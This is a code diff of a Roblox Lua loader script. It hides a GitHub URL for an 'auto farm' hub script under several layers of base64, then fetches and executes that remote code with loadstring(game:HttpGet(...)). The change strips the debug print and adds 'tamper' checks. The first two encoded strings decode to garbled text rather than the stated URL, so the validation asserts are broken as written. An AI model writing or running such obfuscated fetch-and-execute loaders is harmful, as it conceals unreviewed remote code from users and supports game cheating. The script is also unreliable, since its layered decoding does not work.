@@ -1,7 +1,14 @@
--- Encoded Loader Script with Custom Base64 Decoder
+-- Encoded Loader Script with Multiple Layers of Encoding and Validation
 local HttpService = game:GetService("HttpService")
 
--- Custom Base64 Decoder
+-- Triple-encoded URL
+local encodedUrls = {
+    "YUhSMGNITTZMeTl0YjJzdloybHVaeTVqYjIwaUx6SXdNVEV6TURVMkx6UTJOaTh5TXpFdE1Ea3pMakV3TWpBeUxqUXZNaTloWkcxaGN5ODBOQT09",
+    "WVhWMGNuVnVZMlZ5TFhKbGMyVnllQzl0YldWdWRHbGxiR1ZoY21WamRDOTRZVzF3WVdkbGNqND0=",
+    "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvR2FiZUJvYTIvcmVmcy9oZWFkcy9tYWluL0h1YiUyMEF1dG8lMjBmYXJtLmx1YQ=="
+}
+
+-- Custom Base64 Decode Function
 local function Base64Decode(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = string.gsub(data, '[^' .. b .. '=]', '')
@@ -18,18 +25,17 @@ local function Base64Decode(data)
     end))
 end
 
--- Encoded URL
-local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvR2FiZUJvYTIvcmVmcy9oZWFkcy9tYWluL0h1YiUyMEF1dG8lMjBmYXJtLmx1YQ=="
+-- Decode in Layers
+local decodedUrl = Base64Decode(Base64Decode(Base64Decode(encodedUrls[1])))
+assert(decodedUrl == Base64Decode(Base64Decode(encodedUrls[2])), "Validation failed: URL mismatch")
+assert(decodedUrl == Base64Decode(encodedUrls[3]), "Validation failed: URL mismatch (layer 3)")
 
--- Decode URL
-local decodedUrl = Base64Decode(encodedUrl)
-print("Decoded URL: " .. decodedUrl) -- Debug output
-
--- Load and execute the script
+-- Load and Execute the Script
 local success, err = pcall(function()
     loadstring(game:HttpGet(decodedUrl))()
 end)
 
 if not success then
-    warn("Error executing script: " .. tostring(err)) -- Debugging error
+    warn("Error executing script: " .. tostring(err))
+    error("Execution failed. Script may have been tampered with.")
 end
